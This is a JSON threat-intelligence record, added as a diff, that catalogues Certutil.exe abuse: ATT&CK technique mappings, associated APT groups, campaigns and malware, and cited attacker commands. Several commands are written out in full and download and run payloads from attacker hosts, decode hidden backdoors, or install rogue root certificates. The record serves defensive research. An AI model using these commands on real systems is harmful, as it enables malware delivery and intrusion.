@@ -1,0 +1,2391 @@
+{
+  "type": "lolbin-details",
+  "version": 2,
+  "id": "bdf4a55c-3539-47dc-90b4-d9fcd2e55202",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-08-15T00:00:00.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
+  "name": "Certutil.exe",
+  "image": "certutil.exe",
+  "description": "Command-line utility that can be used to obtain certificate authority information and configure Certificate Services.",
+  "attack": {
+    "id": "S0160",
+    "name": "certutil",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0160",
+    "version": "20.0"
+  },
+  "summary": [
+    "Download files from a given URL",
+    "Base64 encode collected data",
+    "Decode binaries hidden inside certificate files as Base64 information",
+    "Install browser root certificates as a precursor to performing Adversary-in-the-Middle"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\certutil.exe",
+    "c:\\windows\\syswow64\\certutil.exe"
+  ],
+  "hashes": {
+    "MD5": "09A8A29BAA3A451713FD3D07943B4A43"
+  },
+  "capabilities": [
+    "Download",
+    "Encode",
+    "Alternate data streams"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0005:Stealth:T1140",
+    "TA0009:Collection:T1560.001",
+    "TA0011:Command and Control:T1105",
+    "TA0112:Defense Impairment:T1553.004"
+  ],
+  "techniques": [
+    {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "url": "https://attack.mitre.org/techniques/T1140",
+      "tactics": [
+        "Stealth"
+      ]
+    },
+    {
+      "id": "T1560.001",
+      "name": "Archive via Utility",
+      "url": "https://attack.mitre.org/techniques/T1560/001",
+      "tactics": [
+        "Collection"
+      ]
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "url": "https://attack.mitre.org/techniques/T1105",
+      "tactics": [
+        "Command and Control"
+      ]
+    },
+    {
+      "id": "T1553.004",
+      "name": "Install Root Certificate",
+      "url": "https://attack.mitre.org/techniques/T1553/004",
+      "tactics": [
+        "Defense Impairment"
+      ]
+    }
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT28",
+        "attack_id": "G0007",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Earth Lusca",
+        "attack_id": "G1006",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "FIN13",
+        "attack_id": "G1016",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "FIN7",
+        "attack_id": "G0046",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Higaisa",
+        "attack_id": "G0126",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Lotus Blossom",
+        "attack_id": "G0030",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Medusa Group",
+        "attack_id": "G1051",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "menuPass",
+        "attack_id": "G0045",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "OilRig",
+        "attack_id": "G0049",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Rancor",
+        "attack_id": "G0075",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Threat Group-3390",
+        "attack_id": "G0027",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Turla",
+        "attack_id": "G0010",
+        "evidence": [
+          "uses S0160"
+        ]
+      },
+      {
+        "name": "Volt Typhoon",
+        "attack_id": "G1017",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "2025 Poland Wiper Attacks",
+        "attack_id": "C0063",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "APT41 DUST",
+        "attack_id": "C0040",
+        "evidence": [
+          "uses S0160",
+          "names certutil.exe"
+        ]
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "Astaroth",
+        "attack_id": "S0373",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "BabyShark",
+        "attack_id": "S0414",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "CARROTBAT",
+        "attack_id": "S0462",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "ISMInjector",
+        "attack_id": "S0189",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "KONNI",
+        "attack_id": "S0356",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Lucifer",
+        "attack_id": "S0532",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "Netwalker",
+        "attack_id": "S0457",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      },
+      {
+        "name": "StrelaStealer",
+        "attack_id": "S1183",
+        "evidence": [
+          "names certutil.exe"
+        ]
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [
+      {
+        "name": "NOKKI",
+        "type": "malware",
+        "attack_id": "S0353",
+        "evidence": [
+          "uses technique T1140 (v1 research)",
+          "uses technique T1105 (v1 research)"
+        ]
+      }
+    ],
+    "attack_relationships": [
+      {
+        "source": "APT28",
+        "type": "intrusion-set",
+        "attack_id": "G0007",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Unit 42 Sofacy Feb 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/"
+          },
+          {
+            "source_name": "Cybersecurity Advisory GRU Brute Force Campaign July 2021",
+            "url": "https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF"
+          }
+        ]
+      },
+      {
+        "source": "APT28",
+        "type": "intrusion-set",
+        "attack_id": "G0007",
+        "description": "An APT28 macro uses the command certutil -decode to decode contents of a.txt file storing the base64 encoded payload.",
+        "citations": [
+          {
+            "source_name": "Unit 42 Sofacy Feb 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/"
+          },
+          {
+            "source_name": "Palo Alto Sofacy 06-2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/"
+          }
+        ]
+      },
+      {
+        "source": "APT41",
+        "type": "intrusion-set",
+        "attack_id": "G0096",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "FireEye APT41 March 2020",
+            "url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+          }
+        ]
+      },
+      {
+        "source": "APT41",
+        "type": "intrusion-set",
+        "attack_id": "G0096",
+        "description": "APT41 used certutil to download additional files. APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access. APT41 has uploaded Procdump and NATBypass to a staging directory and has used these tools in follow-on activities.",
+        "citations": [
+          {
+            "source_name": "Crowdstrike GTR2020 Mar 2020",
+            "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+          },
+          {
+            "source_name": "apt41_dcsocytec_dec2022",
+            "url": "https://medium.com/@DCSO_CyTec/apt41-the-spy-who-failed-to-encrypt-me-24fc0f49cad1"
+          },
+          {
+            "source_name": "FireEye APT41 March 2020",
+            "url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+          },
+          {
+            "source_name": "Rostovcev APT41 2021",
+            "url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+          },
+          {
+            "source_name": "Group IB APT 41 June 2021",
+            "url": "https://www.group-ib.com/blog/colunmtk-apt41/"
+          }
+        ]
+      },
+      {
+        "source": "Earth Lusca",
+        "type": "intrusion-set",
+        "attack_id": "G1006",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "TrendMicro EarthLusca 2022",
+            "url": "https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Earth Lusca",
+        "type": "intrusion-set",
+        "attack_id": "G1006",
+        "description": "Earth Lusca has used certutil to decode a string into a cabinet file.",
+        "citations": [
+          {
+            "source_name": "TrendMicro EarthLusca 2022",
+            "url": "https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+          }
+        ]
+      },
+      {
+        "source": "FIN13",
+        "type": "intrusion-set",
+        "attack_id": "G1016",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Sygnia Elephant Beetle Jan 2022",
+            "url": "https://web.archive.org/web/20220105132433/https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf"
+          }
+        ]
+      },
+      {
+        "source": "FIN13",
+        "type": "intrusion-set",
+        "attack_id": "G1016",
+        "description": "FIN13 has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file.",
+        "citations": [
+          {
+            "source_name": "Sygnia Elephant Beetle Jan 2022",
+            "url": "https://web.archive.org/web/20220105132433/https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf"
+          },
+          {
+            "source_name": "Mandiant FIN13 Aug 2022",
+            "url": "https://www.mandiant.com/resources/blog/fin13-cybercriminal-mexico"
+          }
+        ]
+      },
+      {
+        "source": "FIN13",
+        "type": "intrusion-set",
+        "attack_id": "G1016",
+        "description": "FIN13 has utilized `certutil` to decode base64 encoded versions of custom malware.",
+        "citations": [
+          {
+            "source_name": "Mandiant FIN13 Aug 2022",
+            "url": "https://www.mandiant.com/resources/blog/fin13-cybercriminal-mexico"
+          }
+        ]
+      },
+      {
+        "source": "FIN7",
+        "type": "intrusion-set",
+        "attack_id": "G0046",
+        "description": "FIN7 has decoded a malicious PowerShell script using `certutil -decode hex` and has decoded an XOR-obfuscated block of data with the key `qawsed1q2w3e`, which led to the installation of Lizar.",
+        "citations": [
+          {
+            "source_name": "Gemini_FIN7_Jan2022",
+            "url": "https://geminiadvisory.io/fin7-flash-drives-spread-remote-access-trojan/"
+          }
+        ]
+      },
+      {
+        "source": "Higaisa",
+        "type": "intrusion-set",
+        "attack_id": "G0126",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Malwarebytes Higaisa 2020",
+            "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/"
+          },
+          {
+            "source_name": "PTSecurity Higaisa 2020",
+            "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/"
+          }
+        ]
+      },
+      {
+        "source": "Higaisa",
+        "type": "intrusion-set",
+        "attack_id": "G0126",
+        "description": "Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.",
+        "citations": [
+          {
+            "source_name": "Malwarebytes Higaisa 2020",
+            "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/"
+          },
+          {
+            "source_name": "Zscaler Higaisa 2020",
+            "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt"
+          }
+        ]
+      },
+      {
+        "source": "Kimsuky",
+        "type": "intrusion-set",
+        "attack_id": "G0094",
+        "description": "Kimsuky has utilized certutil to decode a malicious payload.",
+        "citations": [
+          {
+            "source_name": "Aryaka Kimsuky July 2025",
+            "url": "https://www.aryaka.com/docs/reports/aryaka-kimsuky-apt-operational-blueprint.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Lotus Blossom",
+        "type": "intrusion-set",
+        "attack_id": "G0030",
+        "description": "Lotus Blossom has used certutil during operations.",
+        "citations": [
+          {
+            "source_name": "Symantec Bilbug 2022",
+            "url": "https://www.security.com/threat-intelligence/espionage-asia-governments-cert-authority"
+          }
+        ]
+      },
+      {
+        "source": "Medusa Group",
+        "type": "intrusion-set",
+        "attack_id": "G1051",
+        "description": "Medusa Group has utilized certutil to download additional tools within victim environments.",
+        "citations": [
+          {
+            "source_name": "CISA Medusa Group Medusa Ransomware March 2025",
+            "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+          }
+        ]
+      },
+      {
+        "source": "Medusa Group",
+        "type": "intrusion-set",
+        "attack_id": "G1051",
+        "description": "Medusa Group has leveraged certutil, PowerShell, and Windows Command to download additional tools to include RMM services. Medusa Group has also engaged in “Bring Your Own Vulnerable Driver” (BYOVD) and downloaded vulnerable or signed drivers to the victim environment to disable security tools.",
+        "citations": [
+          {
+            "source_name": "CISA Medusa Group Medusa Ransomware March 2025",
+            "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+          },
+          {
+            "source_name": "Broadcom Medusa Ransomware Medusa Group March 2025",
+            "url": "https://www.security.com/threat-intelligence/medusa-ransomware-attacks"
+          }
+        ]
+      },
+      {
+        "source": "menuPass",
+        "type": "intrusion-set",
+        "attack_id": "G0045",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Accenture Hogfish April 2018",
+            "url": "http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf"
+          },
+          {
+            "source_name": "FireEye APT10 Sept 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"
+          },
+          {
+            "source_name": "Symantec Cicada November 2020",
+            "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
+          }
+        ]
+      },
+      {
+        "source": "menuPass",
+        "type": "intrusion-set",
+        "attack_id": "G0045",
+        "description": "menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT.",
+        "citations": [
+          {
+            "source_name": "Accenture Hogfish April 2018",
+            "url": "http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf"
+          },
+          {
+            "source_name": "FireEye APT10 Sept 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"
+          }
+        ]
+      },
+      {
+        "source": "menuPass",
+        "type": "intrusion-set",
+        "attack_id": "G0045",
+        "description": "menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.",
+        "citations": [
+          {
+            "source_name": "FireEye APT10 Sept 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"
+          }
+        ]
+      },
+      {
+        "source": "OilRig",
+        "type": "intrusion-set",
+        "attack_id": "G0049",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "FireEye APT34 Dec 2017",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
+          },
+          {
+            "source_name": "Symantec Crambus OCT 2023",
+            "url": "https://www.security.com/threat-intelligence/crambus-middle-east-government"
+          }
+        ]
+      },
+      {
+        "source": "OilRig",
+        "type": "intrusion-set",
+        "attack_id": "G0049",
+        "description": "A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.",
+        "citations": [
+          {
+            "source_name": "FireEye APT34 Dec 2017",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
+          },
+          {
+            "source_name": "OilRig New Delivery Oct 2017",
+            "url": "https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/"
+          },
+          {
+            "source_name": "Unit 42 OopsIE! Feb 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/"
+          },
+          {
+            "source_name": "Crowdstrike GTR2020 Mar 2020",
+            "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Rancor",
+        "type": "intrusion-set",
+        "attack_id": "G0075",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Rancor Unit42 June 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+          }
+        ]
+      },
+      {
+        "source": "Rancor",
+        "type": "intrusion-set",
+        "attack_id": "G0075",
+        "description": "Rancor has downloaded additional malware, including by using certutil.",
+        "citations": [
+          {
+            "source_name": "Rancor Unit42 June 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+          }
+        ]
+      },
+      {
+        "source": "Threat Group-3390",
+        "type": "intrusion-set",
+        "attack_id": "G0027",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Trend Micro DRBControl February 2020",
+            "url": "https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Threat Group-3390",
+        "type": "intrusion-set",
+        "attack_id": "G0027",
+        "description": "Threat Group-3390 has downloaded additional malware and tools, including through the use of `certutil`, onto a compromised host.",
+        "citations": [
+          {
+            "source_name": "Dell TG-3390",
+            "url": "https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage"
+          },
+          {
+            "source_name": "Trend Micro DRBControl February 2020",
+            "url": "https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Turla",
+        "type": "intrusion-set",
+        "attack_id": "G0010",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Symantec Waterbug Jun 2019",
+            "url": "https://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments"
+          }
+        ]
+      },
+      {
+        "source": "Volt Typhoon",
+        "type": "intrusion-set",
+        "attack_id": "G1017",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "CISA AA24-038A PRC Critical Infrastructure February 2024",
+            "url": "https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf"
+          },
+          {
+            "source_name": "Secureworks BRONZE SILHOUETTE May 2023",
+            "url": "https://web.archive.org/web/20230601025540/https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations"
+          }
+        ]
+      },
+      {
+        "source": "Volt Typhoon",
+        "type": "intrusion-set",
+        "attack_id": "G1017",
+        "description": "Volt Typhoon has used Base64-encoded data to transfer payloads and commands, including deobfuscation via certutil.",
+        "citations": [
+          {
+            "source_name": "Secureworks BRONZE SILHOUETTE May 2023",
+            "url": "https://web.archive.org/web/20230601025540/https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations"
+          }
+        ]
+      },
+      {
+        "source": "2025 Poland Wiper Attacks",
+        "type": "campaign",
+        "attack_id": "C0063",
+        "description": "During the 2025 Poland Wiper Attacks, the adversaries decoded a Base64-encoded ZIP archive using the built-in certutil.",
+        "citations": [
+          {
+            "source_name": "CERT Polska",
+            "url": "https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf"
+          }
+        ]
+      },
+      {
+        "source": "2025 Poland Wiper Attacks",
+        "type": "campaign",
+        "attack_id": "C0063",
+        "description": "During the 2025 Poland Wiper Attacks, the adversaries decoded a Base64-encoded ZIP archive using the built-in certutil.",
+        "citations": [
+          {
+            "source_name": "CERT Polska",
+            "url": "https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf"
+          }
+        ]
+      },
+      {
+        "source": "APT41 DUST",
+        "type": "campaign",
+        "attack_id": "C0040",
+        "description": "APT41 DUST used certutil to load and execute DUSTPAN.",
+        "citations": [
+          {
+            "source_name": "Google Cloud APT41 2024",
+            "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust"
+          }
+        ]
+      },
+      {
+        "source": "APT41 DUST",
+        "type": "campaign",
+        "attack_id": "C0040",
+        "description": "APT41 DUST involved execution of `certutil.exe` via web shell to download the DUSTPAN dropper.",
+        "citations": [
+          {
+            "source_name": "Google Cloud APT41 2024",
+            "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust"
+          }
+        ]
+      },
+      {
+        "source": "Astaroth",
+        "type": "malware",
+        "attack_id": "S0373",
+        "description": "Astaroth uses certutil and BITSAdmin to download additional malware.",
+        "citations": [
+          {
+            "source_name": "Cofense Astaroth Sept 2018",
+            "url": "https://web.archive.org/web/20200302071436/https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/"
+          },
+          {
+            "source_name": "Securelist Brazilian Banking Malware July 2020",
+            "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+          },
+          {
+            "source_name": "Cybereason Astaroth Feb 2019",
+            "url": "https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research"
+          }
+        ]
+      },
+      {
+        "source": "BabyShark",
+        "type": "malware",
+        "attack_id": "S0414",
+        "description": "BabyShark has encoded data using certutil before exfiltration.",
+        "citations": [
+          {
+            "source_name": "Unit42 BabyShark Feb 2019",
+            "url": "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/"
+          }
+        ]
+      },
+      {
+        "source": "CARROTBAT",
+        "type": "malware",
+        "attack_id": "S0462",
+        "description": "CARROTBAT has the ability to download and execute a remote file via certutil.",
+        "citations": [
+          {
+            "source_name": "Unit 42 CARROTBAT November 2018",
+            "url": "https://unit42.paloaltonetworks.com/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/"
+          }
+        ]
+      },
+      {
+        "source": "ISMInjector",
+        "type": "malware",
+        "attack_id": "S0189",
+        "description": "ISMInjector uses the certutil command to decode a payload file.",
+        "citations": [
+          {
+            "source_name": "OilRig New Delivery Oct 2017",
+            "url": "https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/"
+          }
+        ]
+      },
+      {
+        "source": "KONNI",
+        "type": "malware",
+        "attack_id": "S0356",
+        "description": "KONNI has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.",
+        "citations": [
+          {
+            "source_name": "Medium KONNI Jan 2020",
+            "url": "https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b"
+          },
+          {
+            "source_name": "Malwarebytes Konni Aug 2021",
+            "url": "https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/"
+          }
+        ]
+      },
+      {
+        "source": "Lucifer",
+        "type": "malware",
+        "attack_id": "S0532",
+        "description": "Lucifer can use certutil for propagation on Windows hosts within intranets.",
+        "citations": [
+          {
+            "source_name": "Unit 42 Lucifer June 2020",
+            "url": "https://unit42.paloaltonetworks.com/lucifer-new-cryptojacking-and-ddos-hybrid-malware/"
+          }
+        ]
+      },
+      {
+        "source": "Lucifer",
+        "type": "malware",
+        "attack_id": "S0532",
+        "description": "Lucifer can download and execute a replica of itself using certutil.",
+        "citations": [
+          {
+            "source_name": "Unit 42 Lucifer June 2020",
+            "url": "https://unit42.paloaltonetworks.com/lucifer-new-cryptojacking-and-ddos-hybrid-malware/"
+          }
+        ]
+      },
+      {
+        "source": "Netwalker",
+        "type": "malware",
+        "attack_id": "S0457",
+        "description": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.",
+        "citations": [
+          {
+            "source_name": "Sophos Netwalker May 2020",
+            "url": "https://news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/"
+          }
+        ]
+      },
+      {
+        "source": "Netwalker",
+        "type": "malware",
+        "attack_id": "S0457",
+        "description": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.",
+        "citations": [
+          {
+            "source_name": "Sophos Netwalker May 2020",
+            "url": "https://news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/"
+          }
+        ]
+      },
+      {
+        "source": "StrelaStealer",
+        "type": "malware",
+        "attack_id": "S1183",
+        "description": "StrelaStealer payloads have included strings encrypted via XOR. StrelaStealer JavaScript payloads utilize Base64-encoded payloads that are decoded via certutil to create a malicious DLL file.",
+        "citations": [
+          {
+            "source_name": "PaloAlto StrelaStealer 2024",
+            "url": "https://unit42.paloaltonetworks.com/strelastealer-campaign/"
+          },
+          {
+            "source_name": "DCSO StrelaStealer 2022",
+            "url": "https://medium.com/@DCSO_CyTec/shortandmalicious-strelastealer-aims-for-mail-credentials-a4c3e78c8abc"
+          },
+          {
+            "source_name": "Fortgale StrelaStealer 2023",
+            "url": "https://fortgale.com/blog/malware-analysis/strelastealer-malware-analysis-2/"
+          }
+        ]
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "certutil  -urlcache -split -f hxxp://91.208.184[.]78/2.exe",
+        "intent": "Download 2.exe, a VMProtected Meterpreter downloader that fetches Cobalt Strike BEACON shellcode.",
+        "status": "verified",
+        "source_name": "FireEye APT41 March 2020",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+      },
+      {
+        "command": "certutil.exe -decode 1.txt l.exe",
+        "intent": "Decode a Base64 text file into an Active Directory scanner before running it.",
+        "status": "verified",
+        "source_name": "Crowdstrike GTR2020 Mar 2020",
+        "source_url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+      },
+      {
+        "command": "certutil -addstore -f -user ROOT ProgramData\\cert512121.der",
+        "intent": "Install the attacker's root certificate so Retefe can intercept HTTPS traffic to banking sites.",
+        "status": "verified",
+        "source_name": "Palo Alto Retefe",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2015/08/retefe-banking-trojan-targets-sweden-switzerland-and-japan/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cmd.exe /k certutil -urlcache -split -f hxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe",
+        "intent": "Download and run a payload, triggered by hidden DDE instructions in a weaponized document.",
+        "status": "verified",
+        "source_name": "Palo Alto Sofacy 06-2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/"
+      },
+      {
+        "command": "cmd /c certutil.exe -urlcache -split -f hxxp:\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&start C:\\ProgramData\\1.pdf",
+        "intent": "Download a payload disguised as 1.pdf from the attackers' server and start it.",
+        "status": "verified",
+        "source_name": "Rancor Unit42 June 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cmd.exe /c certutil -decode C:\\ProgramData\\padre1.txt C:\\ProgramData\\GUP.txt",
+        "intent": "Decode the PEM files dropped by the macro into the UPPERCUT backdoor's components.",
+        "status": "verified",
+        "source_name": "FireEye APT10 Sept 2018",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://{redacted}:8000/l0.exe l0.exe",
+        "intent": "The attackers issue this downloader command en masse to targeted computers, which download the Netwalker ransomware executable as a payload.",
+        "status": "verified",
+        "source_name": "Sophos Netwalker Tools May 2020",
+        "source_url": "https://news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/"
+      },
+      {
+        "command": "C:\\Windows\\System32\\certutil.exe\" -decode C:\\Users\\USER\\AppData\\Roaming\\srvRep.txt C:\\Users\\USER\\AppData\\Roaming\\srvConhost.exe",
+        "intent": "The ISMAgent trojan is disguised as a base64 digital certificate and decoded via certutil.exe.",
+        "status": "verified",
+        "source_name": "ClearSky ISMAgent Samples August 2017",
+        "source_url": "https://www.clearskysec.com/ismagent/"
+      },
+      {
+        "command": "cmd /c cmd.exe /c certutil.exe -urlcache -split -f http[:]//188.166.74[.]218/radm.exe %TEMP%/radm.exe&cmd.exe /c %TEMP%\\\\radm.exe",
+        "intent": "The attackers passed the certutil utility to cmd to download radm.exe, which they then executed.",
+        "status": "verified",
+        "source_name": "Cisco Talos Sodinokibi WebLogic April 2019",
+        "source_url": "https://blog.talosintelligence.com/2019/04/sodinokibi-ransomware-exploits-weblogic.html"
+      },
+      {
+        "command": "cd %temp% && certutil -urlcache -split -f http://{BLOCKED}.{BLOCKED}.18.154/debug.exe &&debug.exe",
